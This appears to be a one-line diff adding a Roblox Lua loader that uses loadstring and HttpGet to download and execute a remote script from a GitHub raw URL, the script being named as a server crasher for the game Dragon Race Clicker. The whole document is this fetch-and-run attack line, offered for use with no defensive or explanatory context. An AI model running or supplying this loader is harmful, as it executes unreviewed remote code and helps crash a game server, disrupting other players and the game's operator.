@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JumbleBumble/Scripts/main/DragonRaceClickerServerCrasher.lua",true))()
